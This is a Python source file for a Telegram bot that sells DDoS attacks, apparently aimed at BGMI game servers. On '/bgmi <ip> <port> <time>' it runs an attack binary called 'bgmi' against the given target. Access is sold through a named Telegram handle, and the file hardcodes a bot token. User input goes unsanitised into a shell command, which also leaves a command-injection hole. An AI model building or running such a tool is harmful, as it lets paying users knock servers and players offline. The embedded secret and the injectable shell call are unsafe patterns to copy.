#bgmiddoserpython

import telebot
import subprocess
import datetime
import os
import time
import signal

# Railway setup: keep_alive handles the port binding for web services
try:
    from keep_alive import keep_alive
    keep_alive()
except ImportError:
    pass

# Bot Token and Admin ID
bot = telebot.TeleBot('8749691844:AAF-YCPj_CsbiFM83vkGQ6kfCW20d6fADFE')
admin_id = ["8787952549"]

USER_FILE = "users.txt"
LOG_FILE = "log.txt"

# Ensure files exist
if not os.path.exists(USER_FILE):
    with open(USER_FILE, "w") as f: f.write("")
if not os.path.exists(LOG_FILE):
    with open(LOG_FILE, "w") as f: f.write("")

def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except:
        return []

allowed_user_ids = read_users()

# --- Handlers ---

@bot.message_handler(commands=['add'])
def add_user(message):
    if str(message.chat.id) in admin_id:
        cmd = message.text.split()
        if len(cmd) > 1:
            uid = cmd[1]
            if uid not in allowed_user_ids:
                allowed_user_ids.append(uid)
                with open(USER_FILE, "a") as f: f.write(f"{uid}\n")
                bot.send_message(message.chat.id, f"✅ User {uid} Added!")
            else:
                bot.send_message(message.chat.id, "❌ User already exists.")
    else:
        bot.send_message(message.chat.id, "❌ Admin only command.")

@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        cmd = message.text.split()
        if len(cmd) == 4:
            target, port, duration = cmd[1], cmd[2], cmd[3]
            
            bot.send_message(message.chat.id, f"🚀 ATTACK STARTED!\n\n🎯 Target: {target}\n🔗 Port: {port}\n⏳ Time: {duration}s\n\nBhai, thoda wait karo...")

            try:
                # Give binary execution permission
                os.system("chmod +x bgmi")
                
                # Execute attack binary
                full_command = f"./bgmi {target} {port} {duration} 500"
                result = subprocess.run(full_command, shell=True, capture_output=True, text=True)
                
                if result.returncode == 0:
                    bot.send_message(message.chat.id, f"✅ ATTACK FINISHED SUCCESSFULLY!\n🎯 Target: {target}")
                else:
                    bot.send_message(message.chat.id, f"⚠️ Attack finished with code {result.returncode}.\nError: {result.stderr[:100]}")
            
            except Exception as e:
                bot.send_message(message.chat.id, f"❌ Execution Error: {str(e)}")
        else:
            bot.send_message(message.chat.id, "📝 Usage: /bgmi <ip> <port> <time>")
    else:
        bot.send_message(message.chat.id, "🚫 No Access! Buy from @SODHI_OWNER")

@bot.message_handler(commands=['start'])
def start(message):
    bot.send_message(message.chat.id, f"❄️ Welcome {message.from_user.first_name}!\n\nUse /help for commands.")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    bot.send_message(message.chat.id, "💥 /bgmi <ip> <port> <time>\n👤 /myinfo")

# --- Polling Logic with Conflict Fix ---
if __name__ == "__main__":
    print("Railway Force Instance Cleaner Active...")
    
    # Force delete webhook before starting
    try:
        bot.remove_webhook()
        print("Webhook removed.")
    except:
        pass

    # Wait for other potential Railway instances to be killed by the system
    print("Waiting 10 seconds for clean environment...")
    time.sleep(10)

    while True:
        try:
            print("Attempting to start polling...")
            # Use skip_pending to ignore old commands during the conflict period
            bot.polling(none_stop=True, skip_pending=True, interval=1, timeout=40)
        except Exception as e:
            error_msg = str(e)
            print(f"Polling Error: {error_msg}")
            
            if "Conflict" in error_msg or "409" in error_msg:
                print("CRITICAL: Multiple instances detected. Waiting 30s for session to expire...")
                # Long sleep to force Telegram to drop the other connection
                time.sleep(30)
            else:
                time.sleep(5)
